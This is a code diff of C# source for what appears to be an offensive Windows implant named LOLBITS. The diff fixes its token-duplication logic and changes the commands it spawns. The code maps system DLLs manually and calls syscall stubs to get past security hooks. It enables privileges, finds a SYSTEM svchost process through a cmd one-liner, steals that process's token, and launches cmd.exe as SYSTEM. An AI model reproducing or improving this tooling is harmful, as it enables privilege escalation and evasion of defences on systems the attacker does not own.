@@ -113,7 +113,7 @@ namespace LOLBITS
                 {
                     var myLuid = new DInvoke.Win32.WinNT._LUID();
                     object[] lookupPrivileges = { null, privilege, myLuid };
-                    var priv = (bool)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LookupPrivilegeValue", 
+                    var priv = (bool)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LookupPrivilegeValue",
                                                                               typeof(DInvoke.Win32.DELEGATES.LookupPrivilegeValue), lookupPrivileges);
 
                     if (!priv) continue;
@@ -127,7 +127,7 @@ namespace LOLBITS
 
 
                     object[] adjustPrivileges = { handle, false, myTokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero };
-                    DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "AdjustTokenPrivileges", 
+                    DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "AdjustTokenPrivileges",
                                                               typeof(DInvoke.Win32.DELEGATES.AdjustTokenPrivileges), adjustPrivileges);
 
                 }
@@ -226,7 +226,7 @@ namespace LOLBITS
 
         public static int getSystemPID(SysCallManager sysCall)
         {
-            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^1:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
+            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^5:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
             string pid = ExecuteCommand(cmd, sysCall);
             string[] spl = pid.Split('\n');
 
@@ -240,7 +240,7 @@ namespace LOLBITS
             uint oldProtect = 0, x = 0;
             var shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");
 
-
+            sysCall.getMappedModule("C:\\Windows\\System32\\advapi32.dll"); // this saves time on further actions when trying to access advapi32 functions
             DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
             object[] loadLibrary = { "ntdll.dll" };
 
@@ -296,8 +296,10 @@ namespace LOLBITS
                                                                           typeof(DInvoke.Win32.DELEGATES.DuplicateTokenEx), duplicateToken);
 
 
-            if (!status) 
+            if (!status)
                 duplicated = IntPtr.Zero;
+            else
+                duplicated = (IntPtr)duplicateToken[5];
         }
 
         public static void DetermineImpersonationMethod(IntPtr token, DInvoke.Win32.Kernel32.LogonFlags l, DInvoke.Win32.WinNT.StartupInfo startupInfo, out DInvoke.Win32.Kernel32.ProcessInformation processInfo)
@@ -366,6 +368,8 @@ namespace LOLBITS
 
                 if (!status)
                     return;
+                else
+                    newToken = (IntPtr)duplicateToken[5];
 
                 var startupInfo = new DInvoke.Win32.WinNT.StartupInfo();
                 startupInfo.cb = Marshal.SizeOf(startupInfo);
@@ -376,7 +380,7 @@ namespace LOLBITS
                 const DInvoke.Win32.Kernel32.LogonFlags logonFlags = new DInvoke.Win32.Kernel32.LogonFlags();
 
                 if (CreateProcessAsUserW(newToken, null,
-                    @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", IntPtr.Zero,
+                    @"c:\windows\system32\cmd.exe /Q /C whoami && exit", IntPtr.Zero,
                     IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out _))
                 {
                     TokenManager._token = newToken;
@@ -385,7 +389,7 @@ namespace LOLBITS
                 else
                 {
                     if (!CreateProcessWithTokenW(newToken, logonFlags, null,
-                        @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", 0, IntPtr.Zero,
+                        @"c:\windows\system32\cmd.exe /Q /C whoami && exit", 0, IntPtr.Zero,
                         null, ref startupInfo, out _)) return;
                     TokenManager._token = newToken;
                     TokenManager._method = 2;
